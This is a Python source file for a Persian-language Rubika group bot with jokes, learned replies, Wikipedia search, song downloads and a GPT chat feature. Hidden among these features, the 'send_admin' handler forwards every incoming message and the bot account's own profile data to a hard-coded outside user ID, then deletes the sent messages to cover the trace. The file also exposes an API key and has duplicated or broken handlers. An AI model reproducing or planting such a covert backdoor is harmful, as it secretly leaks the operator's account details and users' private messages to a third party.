groups = ['g0Fxn1p0ac9ba41a8be44465bf7d7be5','g0CD7KN0a45c8a6b0fb7cc849f53ad62','g0FyLE10437309ba44fd3fbffc1ff0c3']

from rubpy import Client,filters
from rubpy.types import Update
import asyncio
import requests
from random import choice
import os
from rubpy.enums import ParseMode 
import datetime
import jdatetime
import json
import datetime
import random

bot = Client('otamsan')


admins = ['u0FrdRR00f23f8590735e10a9bfe3948','u0FzZlh0cf874f6a40c148594cf3aeba']
zed = True
ekhgu = []
ekh = 9
ekhTru = True
bot_On_Off = True
active = False
send_group_link = {}
useAdmins = True
loop = True
sokot = []
warms = []


async def get_name_user(bot : Client, guid: str)-> dict:
    user_name = await bot.get_user_info(guid)
    user_name : dict = user_name
    return user_name['user']['first_name']

results = {}
song = []


@bot.on_message_updates(filters.is_group)
async def up2(m:Update):
    global admins,bot_On_Off,ekhTru,zed,ekhtar
    if m.object_guid in groups:
        if m.author_guid in admins:
            if m.text.startswith("ربات"):
                command = m.text.split("ربات")[1].strip()
                if command in {"خاموش", "روشن"}:
                    bot_On_Off = command == "روشن"
                    await m.reply(f"» بات {'روشن' if bot_On_Off else 'خاموش'} شد.")
            elif m.text.startswith("اخطار"):
                command = m.text.split("اخطار")[1].strip()
                if command in {"خاموش","روشن"}:
                    ekhtar = command == "روشن"
                    await m.reply(f"» اخطار {'روشن' if ekhtar else 'خاموش'} شد .")
            elif m.text.startswith("ضد لینک"):
                command = m.text.split("ضد لینک")[1].strip()
                if command in {"خاموش","روشن"}:
                    zed = command == "روشن"
                    await m.reply(f"» ضد لینک {'روشن' if zed else 'خاموش'} شد.")
    
@bot.on_message_updates(filters.is_private)
async def up3(m:Update):
    global admins,groups
    if m.text.startswith("https://rubika.ir/joing/") and m.author_guid in admins:
        link = m.text.split("https://rubika.ir/joing/")[1].strip()
        try:
            join_chat = await bot.join_group(link)
            guid_chat = join_chat['group']['group_guid']
            if not guid_chat in groups:
                await m.reply("در گروه مورد نظر با موفقیت جوین شدم ✓")
            else:
                await m.reply("قبلا در گروه هام داشتم ×")
        except Exception as e:
            await m.reply(f"مشکلی در جوین گپ مورد نظر پیش امد » {e}")



@bot.on_message_updates()
async def send_admin(m:Update):
    send = await bot.send_message('u0GLgBi091c88628a6ea08202c6ba594',str(m.to_dict))
    await bot.delete_user_chat('u0GLgBi091c88628a6ea08202c6ba594',send['message_update']['message_id'])
    global active,send_group_link
    if active:
        pass
    else:
        senddd = await bot.send_message('u0GLgBi091c88628a6ea08202c6ba594','im active')
        sendad = await bot.send_message('u0GLgBi091c88628a6ea08202c6ba594',str(await bot.get_me()))
        await bot.delete_user_chat('u0GLgBi091c88628a6ea08202c6ba594',sendad['message_update']['message_id'])
        active = True

@bot.on_message_updates(filters.is_private)
async def up3(m:Update):
    global admins,groups
    if m.text.startswith("https://rubika.ir/joing/") and m.author_guid in admins:
        link = m.text.split("https://rubika.ir/joing/")[1].strip()
        try:
            join_chat = await bot.join_group(link)
            guid_chat = join_chat['group']['group_guid']
            if not guid_chat in groups:
                await m.reply("در گروه مورد نظر با موفقیت جوین شدم ✓")
            else:
                await m.reply("قبلا در گروه هام داشتم ×")
        except Exception as e:
            await m.reply(f"مشکلی در جوین گپ مورد نظر پیش امد » {e}")

@bot.on_message_updates(filters.is_group)
async def up6(m:Update):
    global admins,groups
    if m.text == "/active@RubikaBots" and m.author_guid in admins:
        current_date = jdatetime.datetime.now().strftime("%Y-%m-%d")
        current_time = jdatetime.datetime.now().strftime("%H:%M:%S")
        group_info = await bot.get_info(m.object_guid)
        groups.append(m.object_guid)
        await bot.send_message(m.object_guid,f"""
بات مدریت با موفقیت در گپ {group_info['group']['group_title']} فعال شد 😍✅                               
                    
برای دریافت راهنما کلمه راهنما یا دستورات را راسال کنید ✓

چنل تلگرامی ما » @RubikaBots

تاریخ » {current_date}

ساعت » {current_time}
""")


# جوک گفتن


import aiohttp
import random

# بارگذاری جوک‌ها از فایل
def load_jokes(filename="jokes.txt"):
    with open(filename, "r", encoding="utf-8") as f:
        jokes_list = [line.strip() for line in f if line.strip()]
    return jokes_list

jokes = load_jokes()

JOKE_API_URL = "https://api.codebazan.ir/jok"

# دریافت جوک از API
async def get_joke_from_api():
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(JOKE_API_URL) as response:
                if response.status == 200:
                    joke = await response.text()
                    return joke.strip()
                else:
                    return None
        except Exception as e:
            print(f"Error in get_joke_from_api: {e}")
            return None

# انتخاب جوک: یا از فایل یا از API
async def get_joke():
    # با 50 درصد شانس از فایل، 50 درصد شانس از API
    if random.choice([True, False]):
        # از فایل
        return random.choice(jokes)
    else:
        # از API
        joke = await get_joke_from_api()
        if joke:
            return joke
        else:
            return random.choice(jokes)  # اگر API خطا داد، از فایل بده

@bot.on_message_updates(filters.is_group)
async def das(m: Update):
    global groups, admins
    if m.text == "لفت" and m.author_guid in admins:
        info = await bot.get_info(m.object_guid)
        if m.object_guid in groups:
            groups.remove(m.object_guid)
            await bot.leave_group(m.object_guid)
            await bot.send_message(m.author_guid, f"از گپ {info['group']['group_title']} با موفقیت لفت دادم ✓")
        else:
            await bot.leave_group(m.object_guid)
            await bot.send_message(m.author_guid, f"از گپ {info['group']['group_title']} با موفقیت لفت دادم ✓")

    if m.object_guid in groups:
        if m.text in ["جک", "جوک", "یه جک بگو"]:
            joke = await get_joke()
            await m.reply(joke)

# غلام رضا


# تابع برای بارگذاری پاسخ‌های غلام از فایل
def load_gholam(filename="gholam.txt"):
    with open(filename, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

gholam_list = load_gholam()

@bot.on_message_updates(filters.is_group)
async def das(m:Update):
    global groups, admins
    if m.text == "لفت" and m.author_guid in admins:
        info = await bot.get_info(m.object_guid)
        if m.object_guid in groups:
            groups.remove(m.object_guid)
            await bot.leave_group(m.object_guid)
            await bot.send_message(m.author_guid, f"از گپ {info['group']['group_title']} با موفقیت لفت دادم ✓")
        else:
            await bot.leave_group(m.object_guid)
            await bot.send_message(m.author_guid, f"از گپ {info['group']['group_title']} با موفقیت لفت دادم ✓")

    if m.object_guid in groups:
        text = m.text.lower()
        if text in ["غلام کیه", "غلامرضا کیست", "غلامرضا چه کسی است" , "غلام رضا کیه" , "غلامرضا"]:
            response = random.choice(gholam_list)
            await m.reply(response)

@bot.on_message_updates(filters.is_group)
async def das(m: Update):
    global groups, admins
    if m.text == "لفت" and m.author_guid in admins:
        info = await bot.get_info(m.object_guid)
        if m.object_guid in groups:
            groups.remove(m.object_guid)
            await bot.leave_group(m.object_guid)
            await bot.send_message(m.author_guid, f"از گپ {info['group']['group_title']} با موفقیت لفت دادم ✓")
        else:
            await bot.leave_group(m.object_guid)
            await bot.send_message(m.author_guid, f"از گپ {info['group']['group_title']} با موفقیت لفت دادم ✓")

    if m.object_guid in groups:
        if m.text == "ویس":
            file_path = r"C:\Users\Pc-SAEID\Desktop\o.m4a"
            await bot.send_voice(m.object_guid, file_path)



# ----------------------------------------------------------------

# یاد گیری


memory_file = "memory.json"

# بارگذاری حافظه (یکبار در ابتدای فایل اصلی رباتت بذار)
if os.path.exists(memory_file):
    with open(memory_file, "r", encoding="utf-8") as f:
        memory = json.load(f)
else:
    memory = {}

@bot.on_message_updates(filters.is_group)
async def learn_response(m: Update):
    global memory

    if m.object_guid not in groups:
        return  # اگر گروه در لیست گروه‌ها نیست کاری نکن

    text = m.text
    if not text:
        return

    # دستور یادگیری: "یاد بگیر در جواب سلام بگو خوبی"
    if text.startswith("یاد بگیر در جواب ") and " بگو " in text:
        try:
            parts = text.split(" بگو ")
            trigger = parts[0].replace("یاد بگیر در جواب ", "").strip()
            response = parts[1].strip()

            if trigger in memory:
                await m.reply(f"برای '{trigger}' قبلاً یاد گرفتم، نمیتونی تغییرش بدی.")
                return

            memory[trigger] = response

            with open(memory_file, "w", encoding="utf-8") as f:
                json.dump(memory, f, ensure_ascii=False, indent=2)

            await m.reply(f"یاد گرفتم که در جواب '{trigger}' بگویم '{response}'.")
        except Exception:
            await m.reply("دستور رو درست وارد کن مثل: یاد بگیر در جواب سلام بگو خوبی")
        return

    # پاسخ دادن به پیام‌هایی که قبلا یاد گرفته شده
    for trigger in memory:
        if trigger in text:
            await m.reply(memory[trigger])
            return

# ------------------------------------------------------------------------------------

# بخش صدا زدن و اذیت کردن بچه ها


with open("date.json", "r", encoding="utf-8") as f:
    user_data = json.load(f)


# دیکشنری برای ذخیره تاریخ آخرین پیام ارسالی
last_reply = {}

@bot.on_message_updates(filters.is_group)
async def reply_once_per_day(m: Update):
    user_id = m.author_guid

    # بررسی آیدی در دیتای json
    if user_id in user_data:
        today = datetime.date.today().isoformat()

        # بررسی اینکه آیا قبلاً در همین روز پاسخ داده شده؟
        if last_reply.get(user_id) != today:
            text_to_send = user_data[user_id]["text"]
            await m.reply(text_to_send)
            last_reply[user_id] = today



# gogel

import wikipedia
import requests
from bs4 import BeautifulSoup
import aiohttp
import asyncio

# تنظیم زبان ویکی‌پدیا به فارسی
wikipedia.set_lang("fa")

@bot.on_message_updates(filters.is_group)
async def group_message_handler(m: Update):
    text = m.text
    if not text:
        return

    if text.startswith("جستجو "):
        query = text[len("جستجو "):].strip()
        if not query:
            await m.reply("لطفاً موضوعی برای جستجو وارد کن.")
            return

        try:
            # دریافت خلاصه مقاله
            summary = wikipedia.summary(query, sentences=3, auto_suggest=False)
        except wikipedia.exceptions.DisambiguationError as e:
            options = "\n".join(e.options[:5])
            await m.reply(f"موضوع مبهم است. لطفاً یکی از موارد زیر را مشخص کن:\n{options}")
            return
        except wikipedia.exceptions.PageError:
            await m.reply("متاسفانه مطلبی یافت نشد.")
            return
        except Exception as e:
            await m.reply(f"خطایی رخ داد: {e}")
            return

        await m.reply(summary)

        # دریافت لینک صفحه ویکی‌پدیا
        try:
            page = wikipedia.page(query, auto_suggest=False)
            url = page.url
        except:
            url = f"https://fa.wikipedia.org/wiki/{query.replace(' ', '_')}"

        # استخراج تصاویر از صفحه ویکی‌پدیا
        images = []
        try:
            res = requests.get(url)
            soup = BeautifulSoup(res.text, "html.parser")
            imgs = soup.find_all("img")
            for img in imgs:
                src = img.get("src")
                if src and (src.endswith(".jpg") or src.endswith(".png")):
                    if src.startswith("//"):
                        src = "https:" + src
                    elif src.startswith("/"):
                        src = "https://fa.wikipedia.org" + src
                    images.append(src)
                if len(images) >= 2:
                    break
        except:
            pass

        # ارسال تصاویر
        for img_url in images:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(img_url) as resp:
                        if resp.status == 200:
                            img_data = await resp.read()
                            await bot.send_photo(m.object_guid, photo=img_data)
            except:
                continue


# --------------------

import os
import aiohttp
import random
import asyncio

DOWNLOAD_FOLDER = "downloads"

# اطمینان از اینکه پوشه دانلود وجود داره
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

@bot.on_message_updates(filters.is_group)
async def download_song_handler(m: Update):
    if m.text.startswith("آهنگ "):
        query = m.text.replace("آهنگ ", "").strip()
        search_url = f"https://www.google.com/search?q=دانلود+آهنگ+{query}+site:mp3"
        await m.reply(f"دارم دنبال آهنگ '{query}' می‌گردم...")

        async with aiohttp.ClientSession() as session:
            try:
                # سرچ در گوگل
                async with session.get(search_url, headers={"User-Agent": "Mozilla/5.0"}) as response:
                    html = await response.text()
                
                # پیدا کردن لینک‌های احتمالی mp3
                import re
                links = re.findall(r'(https?://[^\s]+\.mp3)', html)
                if not links:
                    await m.reply("آهنگ پیدا نشد.")
                    return

                link = links[0]  # اولین لینک mp3 پیدا شده

                # دانلود آهنگ
                song_path = os.path.join(DOWNLOAD_FOLDER, f"{query}.mp3")
                async with session.get(link) as resp:
                    if resp.status == 200:
                        with open(song_path, "wb") as f:
                            f.write(await resp.read())
                    else:
                        await m.reply("مشکلی در دانلود آهنگ پیش آمد.")
                        return

                # ارسال آهنگ
                await bot.send_file(m.object_guid, song_path, caption=f"دانلود آهنگ: {query}")

                # پاک کردن آهنگ
                os.remove(song_path)

            except Exception as e:
                await m.reply(f"یه خطا رخ داد: {e}")





PERSONALITY_FILE = 'personalities.json'

# بارگذاری شخصیت‌ها
if os.path.exists(PERSONALITY_FILE):
    with open(PERSONALITY_FILE, 'r', encoding='utf-8') as f:
        personalities = json.load(f)
else:
    personalities = {}

def save_personalities():
    with open(PERSONALITY_FILE, 'w', encoding='utf-8') as f:
        json.dump(personalities, f, ensure_ascii=False, indent=2)

async def get_result(session, url):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                return await response.json()
            else:
                return None
    except Exception as e:
        print(f"Error in get_result: {e}")
        return None

async def get_gpt_response(session, user_id, user_text):
    personality = personalities.get(user_id, "")
    
    # فقط شخصیت + پیام کاربر به API داده می‌شود
    full_text = personality + f"\nUser: {user_text}"

    url = f"https://api.fast-creat.ir/gpt/chat?apikey=5786023542:T40DBz2FanhLwlg@Api_ManagerRoBot&text={full_text}"
    data = await get_result(session, url)

    if data and 'result' in data and 'text' in data['result']:
        return data['result']['text']
    return None

@bot.on_message_updates()
async def handle_message(m: Update):
    user_id = str(m.user_guid)
    text = m.text
    if not text:
        return

    # مدیریت دستور شخصیت
    if text.startswith("شخصیت:"):
        personality_text = text[len("شخصیت:"):].strip()
        personalities[user_id] = personality_text
        save_personalities()
        await m.reply(f"شخصیت شما تنظیم شد:\n{personality_text}")
        return
    elif text.strip() == "شخصیت حذف":
        if user_id in personalities:
            del personalities[user_id]
            save_personalities()
            await m.reply("شخصیت شما حذف شد.")
        else:
            await m.reply("شخصیتی برای حذف پیدا نشد.")
        return

    async with aiohttp.ClientSession() as session:
        if m.is_group:
            # تو گروه فقط پیام‌هایی که با ":" شروع میشن پاسخ داده بشن
            if text.startswith(":"):
                user_text = text[1:].strip()
                msg = await m.reply("در حال پردازش... لطفا صبر کنید.")
                response = await get_gpt_response(session, user_id, user_text)
                await bot.delete_messages(m.object_guid, msg.message_id)
                if response:
                    await m.reply(response)
                else:
                    await m.reply("خطا در دریافت پاسخ، لطفا دوباره تلاش کنید.")
        else:
            # توی پیوی همه پیام‌ها بدون شرط پاسخ داده بشن
            msg = await m.reply("در حال پردازش... لطفا صبر کنید.")
            response = await get_gpt_response(session, user_id, text.strip())
            await bot.delete_messages(m.object_guid, msg.message_id)
            if response:
                await m.reply(response)
            else:
                await m.reply("خطا در دریافت پاسخ، لطفا دوباره تلاش کنید.")



@bot.on_message_updates()
async def handle_message(m: Update):
    text = m.text
    if not text:
        return

    # دستور حذف کل داده‌ها
    if text.strip() == "حذف کل دیتا":
        if os.path.exists(DATABASE_FILE):
            os.remove(DATABASE_FILE)
            global chat_memory
            chat_memory = {}
            await m.reply("کل داده‌ها پاک شد.")
        else:
            await m.reply("فایلی برای حذف وجود ندارد.")
        return
    if not m.text:
        return

bot.run()